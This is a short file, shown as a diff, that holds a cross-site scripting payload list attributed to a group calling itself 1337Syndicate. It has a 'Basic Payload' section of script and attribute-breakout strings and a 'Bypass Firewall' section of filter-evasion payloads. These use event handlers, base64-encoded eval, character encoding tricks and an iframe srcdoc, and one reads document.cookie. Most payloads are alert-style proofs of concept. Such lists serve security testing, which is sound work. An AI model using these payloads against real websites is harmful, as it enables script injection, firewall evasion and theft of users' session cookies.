@@ -1,0 +1,43 @@
+Catatan XylaufyyyId
+
+1337Syndicate
+"IT Security Development Research"
+https://1337syndicate.github.io/
+
+Cross Site Scripting Payload
+
+Basic Payload
+<script>alert('1337Syndicate')</script>
+<img src="javascript:alert('1337Syndicate');">
+<script>alert("1337Syndicate");</script>
+`"autofocus onfocus="alert(1)`
+`"autofocus onfocus=alert(1)//`
+`"onbeforescriptexecute=alert(1)//`
+`"onmouseover="alert(1)//` (Interaction)
+`"autofocus onblur="alert(1)` (Interaction)
+`'autofocus onfocus='alert(1)`
+`'autofocus onfocus=alert(1)//`
+`'onbeforescriptexecute=alert(1)//`
+`'onmouseover='alert(1)//` (Interaction)
+`'autofocus onblur='alert(1)` (Interaction)
+
+Bypass Firewall
+"><input/onauxclick="[1].map(prompt)">
+<img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />
+'"--><Body onbeforescriptexecute="[1].map(confirm)">
+'-prompt.call(window, '1337Syndicate')-'
+'-alert.call(window, '1337Syndicate')-'
+<\/script><script>alert('1337Syndicate')<\/script>
+aaa"bbb'ccc<svg onload=alert('1337Syndicate')>eee
+javascript://%0a%0dalert(document.cookie)
+<--`<img/src=`%20onerror=confirm``>%20--!>
+<svg </onload ="1> (_=alert,_('1337Syndicate')) "">
+<details/open/ontoggle=window.alert`1337Syndicate`>
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+
+
+
+"IT Security Development Research"
+https://1337syndicate.github.io/
